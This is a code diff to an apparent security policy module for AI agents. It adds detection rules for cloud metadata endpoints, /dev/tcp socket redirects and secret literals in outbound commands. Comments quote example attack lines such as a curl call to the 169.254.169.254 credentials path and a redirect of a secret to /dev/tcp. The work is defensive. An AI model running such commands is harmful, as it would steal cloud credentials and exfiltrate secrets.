@@ -220,6 +220,9 @@ def shell_outbound_kind(command: str, network_scripts: dict = None):
     s = _normalize_shell(command)
     segments = _shell_segments(s)
 
+    for host in DEV_NET_RE.findall(s):
+        if not is_trusted_host(host):
+            return "external"
     if NETWORK_SHELL_RE.search(s):
         if _shell_call_is_external(s):
             return "external"
@@ -277,8 +280,40 @@ ALLOWLISTED_DOMAINS = {
     "localhost",
     "127.0.0.1",
     "internal.local",
-    "api.your-own-service.com",  # placeholder: swap for your real internal API host
 }
+
+# Cloud instance metadata services hand out the machine's cloud credentials
+# to anything that asks (the classic SSRF target). An agent has no business
+# reading them, tainted session or not -- found 2026-11-06: `curl
+# http://169.254.169.254/latest/meta-data/iam/...` was allowed in a clean
+# session. Matched anywhere in the target so `169.254.169.254.nip.io`-style
+# rebinding names and the decimal / hex spellings of the IP are caught too.
+CLOUD_METADATA_RE = re.compile(
+    r"169\.254\.169\.254|169\.254\.170\.2\b|\b2852039166\b|\b0xa9fea9fe\b|"
+    r"fd00:ec2::254|metadata\.google\.internal|metadata\.goog\b|"
+    r"100\.100\.100\.200|metadata\.azure\.com",
+    re.I,
+)
+
+# Raw socket redirects (`cat secret > /dev/tcp/1.2.3.4/443`): bash opens the
+# connection itself, no network tool appears in the command -- found
+# 2026-11-06 via the argox-dataflow battery.
+DEV_NET_RE = re.compile(r"/dev/(?:tcp|udp)/([^/\s'\"]+)/")
+
+# Secrets typed straight into an outbound command (`curl -d 'k=AKIA...'`):
+# the agent saw the value earlier (maybe before this session, maybe via a
+# tool we don't hook), so session taint alone can miss it. Vendor key shapes
+# and private keys only -- SECRET_RE's generic 32+ hex alternative would
+# match every git SHA in a GitHub API URL -- plus name=value assignments.
+OUTBOUND_SECRET_RE = re.compile(
+    r"(sk-[a-zA-Z0-9_-]{16,}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|AIza[0-9A-Za-z\-_]{35}|"
+    r"gh[pousr]_[a-zA-Z0-9]{20,}|github_pat_[a-zA-Z0-9_]{20,}|gsk_[a-zA-Z0-9]{20,}|xox[abpr]-[a-zA-Z0-9-]{10,}|"
+    r"eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}|-----BEGIN [A-Z ]*PRIVATE KEY-----)"
+)
+
+
+def outbound_secret_literal(text: str) -> bool:
+    return bool(text) and bool(OUTBOUND_SECRET_RE.search(text) or ASSIGNED_SECRET_RE.search(text))
 
 # User-added trusted destinations for the call currently being evaluated.
 # A ContextVar rather than a parameter threaded through every host helper
@@ -379,6 +414,7 @@ _DEFAULT_RULE_TOGGLES = {
     "credential_file_protection": True,
     "untrusted_content_egress_flag": True,
     "session_taint_carryover": True,
+    "cloud_metadata_blocking": True,
 }
 
 RULE_TOGGLE_LABELS = {
@@ -388,6 +424,7 @@ RULE_TOGGLE_LABELS = {
     "baseline_external_flagging": "Flag (low-risk, still allowed) any untainted call to a new external domain",
     "credential_file_protection": "Block reading credential stores (~/.ssh, ~/.aws, cloud CLI logins, private keys) and full environment dumps",
     "untrusted_content_egress_flag": "Flag outbound calls made after the agent read outside content (web pages, API responses, MCP tools) -- the prompt-injection pattern",
+    "cloud_metadata_blocking": "Block access to cloud metadata endpoints (169.254.169.254, metadata.google.internal, ...) -- they hand out the machine's cloud credentials",
     "session_taint_carryover": "Carry sensitive-data tracking into a new session started in the same folder within 30 minutes (e.g. after /clear or a restart)",
 }
 
@@ -821,6 +858,14 @@ def _evaluate_call(
             if dump_reason:
                 return PolicyResult(Decision.BLOCK, 100, [dump_reason])
 
+    # 1c. Cloud metadata endpoint -> block regardless of taint (credentials)
+    if (
+        toggles.get("cloud_metadata_blocking", True)
+        and tool_name in ("run_shell", "call_api")
+        and CLOUD_METADATA_RE.search(_normalize_shell(target) if tool_name == "run_shell" else target)
+    ):
+        return PolicyResult(Decision.BLOCK, 100, ["cloud_metadata_access"])
+
     # 2. Secret data leaving the boundary -> always block
     # (call_api and network-shelling-out only, via _crosses_trust_boundary
     # -- write_file's target is always a LOCAL filesystem path in this
@@ -837,6 +882,18 @@ def _evaluate_call(
         if tool_name == "run_shell" and shell_outbound_kind(target, network_scripts) == "confirm":
             return PolicyResult(Decision.PENDING_CONFIRM, 80, ["secret_session_publish"])
         return PolicyResult(Decision.BLOCK, 95, ["secret_data_exfil_attempt"])
+
+    # 2b. A secret typed into the outbound call itself, whatever the session
+    # holds. Asks rather than blocks: `curl -H "Authorization: Bearer sk-..."
+    # https://api.openai.com` is a developer using their own key with its
+    # own vendor -- a person can tell that apart from a paste site.
+    if (
+        toggles.get("secret_exfil_blocking", True)
+        and tool_name in ("run_shell", "call_api")
+        and outbound_secret_literal(target)
+        and _crosses_trust_boundary(tool_name, target, network_scripts)
+    ):
+        return PolicyResult(Decision.PENDING_CONFIRM, 85, ["secret_literal_in_outbound_call"])
 
     # 3. PII crossing the boundary -> pause for confirmation
     if toggles.get("pii_internal_boundary_confirm", True) and Tag.PII in inherited_tags and _crosses_trust_boundary(tool_name, target, network_scripts):
